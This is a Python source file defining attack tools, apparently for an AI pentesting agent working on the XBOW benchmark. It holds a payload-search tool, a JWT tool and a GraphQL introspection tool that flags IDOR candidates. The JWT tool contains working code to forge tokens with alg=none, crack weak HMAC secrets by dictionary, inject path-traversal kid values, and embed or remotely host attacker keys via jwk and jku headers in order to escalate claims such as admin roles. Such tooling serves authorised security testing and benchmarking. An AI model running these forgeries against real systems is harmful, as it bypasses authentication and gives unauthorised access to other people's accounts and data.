"""
web_weapons.py - specialized web-attack tools (broken-authz is 24% of XBOW).

  - search_payloads : query the offline payload/technique corpus (don't invent).
  - jwt_tool        : parse / forge / alg-confusion / crack JWTs (RFC 7519).
  - graphql         : introspect a GraphQL endpoint and surface ID-shaped IDOR args.

Dependency-free (hmac/base64/hashlib/json only), so they work in any sandbox.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any, Optional

from plugins.sdk.base_tool import BaseTool, Permission, ToolResult
from security_tools.payloads import search_payloads, VULN_CLASSES


# ------------------------------------------------------------------ #
# Payload corpus tool
# ------------------------------------------------------------------ #

class SearchPayloadsTool(BaseTool):
    name = "search_payloads"
    description = (
        "Look up REAL attack payloads/techniques from a curated offline corpus instead "
        "of inventing them. Search by vuln_class (sqli, xss, ssti, rce, lfi, ssrf, xxe, "
        "idor, auth, upload, deserialization) and/or a keyword. Returns the payload "
        "string + bypass notes. USE THIS before hand-crafting an injection/auth payload."
    )
    parameters = {
        "type": "object",
        "properties": {
            "vuln_class": {"type": "string",
                           "description": f"One of: {', '.join(VULN_CLASSES)}"},
            "keyword": {"type": "string",
                        "description": "Optional keyword filter, e.g. 'imds', 'jinja', 'blind'"},
        },
    }
    permissions: set = set()
    tags = ["web", "payloads", "reference", "knowledge"]

    async def execute(self, vuln_class: str = "", keyword: str = "",
                      **kwargs: Any) -> ToolResult:
        hits = search_payloads(vuln_class, keyword)
        if not hits:
            return ToolResult.ok(
                f"No payloads matched (class={vuln_class!r}, keyword={keyword!r}). "
                f"Available classes: {', '.join(VULN_CLASSES)}.")
        lines = [f"{len(hits)} payload(s):"]
        for p in hits[:25]:
            lines.append(f"\n[{p.vuln_class}] {p.title}\n  payload: {p.payload}"
                         + (f"\n  notes: {p.notes}" if p.notes else ""))
        return ToolResult.ok("\n".join(lines),
                             metadata={"count": len(hits), "class": vuln_class})


# ------------------------------------------------------------------ #
# JWT tool
# ------------------------------------------------------------------ #

def _b64url_decode(seg: str) -> bytes:
    seg = seg + "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg.encode("ascii"))


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _jwt_parts(token: str) -> tuple[dict, dict, str]:
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT (need header.payload[.signature])")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def _sign_hs(alg: str, signing_input: bytes, secret: bytes) -> str:
    algo = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
            "HS512": hashlib.sha512}[alg]
    return _b64url_encode(hmac.new(secret, signing_input, algo).digest())


def _rsa_keypair_and_jwk() -> Optional[tuple]:
    """Generate an RS256 keypair + its public JWK (n/e). Returns (private_key, jwk) or
    None if the optional `cryptography` package is absent. The header-injection JWT
    attacks (jwk/jku) need RS256 signing, which stdlib can't do."""
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
    except Exception:
        return None
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    nums = key.public_key().public_numbers()

    def _b64uint(x: int) -> str:
        b = x.to_bytes((x.bit_length() + 7) // 8, "big")
        return _b64url_encode(b)

    jwk = {"kty": "RSA", "kid": "attacker", "use": "sig", "alg": "RS256",
           "n": _b64uint(nums.n), "e": _b64uint(nums.e)}
    return key, jwk


def _sign_rs256(private_key: Any, signing_input: bytes) -> str:
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding
    sig = private_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    return _b64url_encode(sig)


def _forge_rs256(header: dict, claims: dict, private_key: Any) -> str:
    si = (f"{_b64url_encode(json.dumps(header, separators=(',', ':')).encode())}."
          f"{_b64url_encode(json.dumps(claims, separators=(',', ':')).encode())}")
    return si + "." + _sign_rs256(private_key, si.encode())


class JwtTool(BaseTool):
    name = "jwt_tool"
    description = (
        "Parse, forge, and attack JSON Web Tokens (broken-authz). actions:\n"
        "- 'parse': decode a token's header + claims (no verification).\n"
        "- 'forge': re-sign a token with modified claims (json) using a known 'secret' "
        "(HS256/384/512), or 'alg_none' to strip the signature (alg=none attack).\n"
        "- 'crack': dictionary-attack an HS256/384/512 secret with a wordlist (list of "
        "candidate secrets) - confirms a weak signing key.\n"
        "HEADER-INJECTION attacks (the server trusts key material named in the token "
        "header):\n"
        "- 'kid_inject': forge a token whose 'kid' header points the server at a "
        "file/value you control (path traversal like ../../../../dev/null, or /dev/null), "
        "HMAC-signed with that file's known content ('secret', default empty). Beats "
        "servers that do key = read(kid).\n"
        "- 'jwk_inject': embed a self-signed public JWK in the header ('jwk') and sign "
        "RS256 with the matching private key (CVE-2018-0114) - beats libs that trust the "
        "embedded key.\n"
        "- 'jku_inject': forge a token whose 'jku' header points at an attacker URL "
        "('jku_url') and RS256-sign it; the tool emits the JWK Set to host at that URL.\n"
        "Classic wins: alg=none, a weak HMAC secret, or (for RS256 servers that also "
        "accept HS256) signing with the RSA public key as the HMAC secret. (jwk/jku need "
        "the optional `cryptography` package.)"
    )
    parameters = {
        "type": "object",
        "properties": {
            "action": {"type": "string",
                       "description": "parse | forge | crack | kid_inject | jwk_inject | jku_inject",
                       "default": "parse"},
            "token": {"type": "string", "description": "The JWT to operate on"},
            "claims": {"type": "object", "description": "forge/*_inject: claim overrides to merge (e.g. {\"role\":\"admin\"})"},
            "secret": {"type": "string", "description": "forge/crack: HMAC secret; kid_inject: the content the kid resolves to (default empty)"},
            "alg_none": {"type": "boolean", "description": "forge: produce an alg=none token", "default": False},
            "wordlist": {"type": "array", "items": {"type": "string"},
                         "description": "crack: candidate secrets to try"},
            "kid": {"type": "string", "description": "kid_inject: the 'kid' header value (e.g. ../../../../dev/null)"},
            "jku_url": {"type": "string", "description": "jku_inject: attacker URL to host the JWK Set at"},
        },
        "required": ["action", "token"],
    }
    permissions: set = set()
    tags = ["web", "jwt", "auth", "authz"]

    async def execute(self, action: str = "parse", token: str = "",
                      claims: Optional[dict] = None, secret: str = "",
                      alg_none: bool = False, wordlist: Optional[list] = None,
                      kid: str = "", jku_url: str = "",
                      **kwargs: Any) -> ToolResult:
        action = (action or "parse").lower()
        try:
            header, payload, sig = _jwt_parts(token)
        except Exception as exc:
            return ToolResult.fail(f"Could not parse JWT: {exc}")

        if action == "parse":
            return ToolResult.ok(
                f"Header: {json.dumps(header)}\nClaims: {json.dumps(payload, indent=2)}\n"
                f"Signature present: {bool(sig)} | alg: {header.get('alg')}")

        if action == "forge":
            new_claims = {**payload, **(claims or {})}
            if alg_none:
                h = {**header, "alg": "none"}
                tok = f"{_b64url_encode(json.dumps(h,separators=(',',':')).encode())}." \
                      f"{_b64url_encode(json.dumps(new_claims,separators=(',',':')).encode())}."
                return ToolResult.ok(f"alg=none token (empty signature):\n{tok}\n"
                                     "Send it where the original went; works if the server "
                                     "trusts the 'none' algorithm.")
            alg = header.get("alg", "HS256").upper()
            if alg not in ("HS256", "HS384", "HS512"):
                alg = "HS256"
            if not secret:
                return ToolResult.fail("forge needs a 'secret' (or set alg_none=true).")
            h = {**header, "alg": alg}
            si = (f"{_b64url_encode(json.dumps(h,separators=(',',':')).encode())}."
                  f"{_b64url_encode(json.dumps(new_claims,separators=(',',':')).encode())}")
            tok = si + "." + _sign_hs(alg, si.encode(), secret.encode())
            return ToolResult.ok(f"Forged {alg} token (secret={secret!r}):\n{tok}")

        if action == "crack":
            alg = header.get("alg", "HS256").upper()
            if alg not in ("HS256", "HS384", "HS512"):
                return ToolResult.fail(f"crack only supports HS*, token uses {alg}.")
            si = ".".join(token.split(".")[:2]).encode()
            for cand in (wordlist or ["secret", "password", "123456", "admin", "key",
                                      "changeme", "jwt", "s3cr3t"]):
                if _sign_hs(alg, si, cand.encode()) == sig:
                    return ToolResult.ok(f"CRACKED - secret is {cand!r}. Forge with "
                                         f"action=forge secret={cand!r}.",
                                         metadata={"secret": cand})
            return ToolResult.ok("No candidate secret matched. Provide a larger wordlist.")

        if action == "kid_inject":
            # The server resolves the signing key by reading the path/value in `kid`.
            # Point it at a file whose content we know (default: empty, e.g. /dev/null or
            # a traversal to it) and HMAC-sign with that content.
            new_claims = {**payload, **(claims or {})}
            kid_val = kid or "../../../../../../dev/null"
            h = {**header, "alg": "HS256", "kid": kid_val}
            si = (f"{_b64url_encode(json.dumps(h, separators=(',', ':')).encode())}."
                  f"{_b64url_encode(json.dumps(new_claims, separators=(',', ':')).encode())}")
            tok = si + "." + _sign_hs("HS256", si.encode(), (secret or "").encode())
            return ToolResult.ok(
                f"kid-injection token (kid={kid_val!r}, HMAC key={secret or '(empty)'!r}):\n"
                f"{tok}\n\nWorks if the server builds the HMAC key from read(kid). Empty "
                "key targets a kid that resolves to empty/predictable content; also try "
                "kid values like '/dev/null', or a SQLi/command-injection kid on stacks "
                "that look the key up dynamically.",
                metadata={"kid": kid_val})

        if action in ("jwk_inject", "jku_inject"):
            kp = _rsa_keypair_and_jwk()
            if kp is None:
                return ToolResult.fail(
                    f"{action} needs the optional `cryptography` package to RS256-sign. "
                    "Install it (pip install cryptography) and retry.")
            priv, jwk = kp
            new_claims = {**payload, **(claims or {})}
            base_h = {k: v for k, v in header.items() if k not in ("jwk", "jku", "x5u")}
            if action == "jwk_inject":
                h = {**base_h, "alg": "RS256", "kid": jwk["kid"], "jwk": jwk}
                tok = _forge_rs256(h, new_claims, priv)
                return ToolResult.ok(
                    "jwk-injection token (self-signed key embedded in the header, "
                    "CVE-2018-0114):\n" + tok + "\n\nBeats libraries that verify against "
                    "the token's OWN embedded 'jwk' instead of a trusted key.",
                    metadata={"attack": "jwk"})
            # jku_inject
            if not jku_url:
                return ToolResult.fail("jku_inject needs 'jku_url' (where you'll host the JWK Set).")
            h = {**base_h, "alg": "RS256", "kid": jwk["kid"], "jku": jku_url}
            tok = _forge_rs256(h, new_claims, priv)
            jwks = json.dumps({"keys": [jwk]}, indent=2)
            return ToolResult.ok(
                f"jku-injection token (jku={jku_url}):\n{tok}\n\n"
                f"HOST THIS JWK Set at {jku_url} so the server fetches it and trusts the "
                f"key:\n{jwks}\n\nWorks if the server fetches the key from the "
                "attacker-controlled jku URL without allow-listing the host.",
                metadata={"attack": "jku", "jku_url": jku_url})

        return ToolResult.fail(
            "Unknown action. Use parse | forge | crack | kid_inject | jwk_inject | jku_inject.")


# ------------------------------------------------------------------ #
# GraphQL tool
# ------------------------------------------------------------------ #

_INTROSPECTION = ("{__schema{queryType{name}mutationType{name}types{name kind "
                  "fields{name args{name type{name kind ofType{name kind}}}}}}}")


class GraphqlTool(BaseTool):
    name = "graphql"
    description = (
        "Attack a GraphQL endpoint. actions:\n"
        "- 'introspect': send an introspection query to <url> (via http_request-style "
        "network) and list every Query/Mutation field.\n"
        "- 'analyze': given introspection JSON (schema), enumerate fields and flag "
        "ID-SHAPED arguments (id, *Id, uuid) that are classic IDOR candidates.\n"
        "Introspection is often left enabled; ID-typed args are where broken access "
        "control lives - then test them with http_request/http_repeater."
    )
    parameters = {
        "type": "object",
        "properties": {
            "action": {"type": "string", "description": "introspect | analyze", "default": "introspect"},
            "url": {"type": "string", "description": "introspect: the GraphQL endpoint URL"},
            "schema": {"type": "object", "description": "analyze: introspection result JSON"},
        },
    }
    permissions = {Permission.NETWORK}
    tags = ["web", "graphql", "idor", "authz"]

    def __init__(self, session: Any = None, **kwargs: Any) -> None:
        super().__init__(**kwargs)
        self.session = session

    async def execute(self, action: str = "introspect", url: str = "",
                      schema: Optional[dict] = None, **kwargs: Any) -> ToolResult:
        action = (action or "introspect").lower()
        if action == "introspect":
            if not url:
                return ToolResult.fail("introspect needs a url.")
            from browser.http_client import HttpClient
            cookies = getattr(self.session, "cookies", None)
            async with HttpClient(timeout=20.0, cookies=cookies) as client:
                resp = await client.request("POST", url,
                                            json={"query": _INTROSPECTION})
            if resp.status_code and resp.status_code >= 400:
                return ToolResult.ok(
                    f"Introspection returned {resp.status_code} - it may be disabled. "
                    f"Body: {(resp.text or '')[:500]}")
            try:
                data = json.loads(resp.text)
                sch = data.get("data", {}).get("__schema", data.get("__schema"))
            except Exception:
                return ToolResult.ok(f"Non-JSON response ({resp.status_code}): "
                                     f"{(resp.text or '')[:500]}")
            return ToolResult.ok(self._analyze(sch or {}),
                                 metadata={"status": resp.status_code})
        if action == "analyze":
            sch = schema or {}
            sch = sch.get("data", {}).get("__schema", sch.get("__schema", sch))
            return ToolResult.ok(self._analyze(sch))
        return ToolResult.fail("Unknown action. Use introspect | analyze.")

    @staticmethod
    def _analyze(schema: dict) -> str:
        types = schema.get("types") or []
        qname = (schema.get("queryType") or {}).get("name")
        mname = (schema.get("mutationType") or {}).get("name")
        lines: list[str] = []
        idor: list[str] = []
        for t in types:
            if t.get("name") in (qname, mname) and t.get("fields"):
                role = "Query" if t["name"] == qname else "Mutation"
                for f in t["fields"]:
                    args = f.get("args") or []
                    argstr = ", ".join(a.get("name", "") for a in args)
                    lines.append(f"  [{role}] {f.get('name')}({argstr})")
                    for a in args:
                        an = (a.get("name") or "").lower()
                        if an == "id" or an.endswith("id") or "uuid" in an:
                            idor.append(f"{f.get('name')}.{a.get('name')}")
        out = ["GraphQL schema fields:"] + (lines or ["  (none found)"])
        if idor:
            out.append("\nID-shaped args (IDOR candidates - fuzz these):")
            out += [f"  - {x}" for x in idor]
        return "\n".join(out)
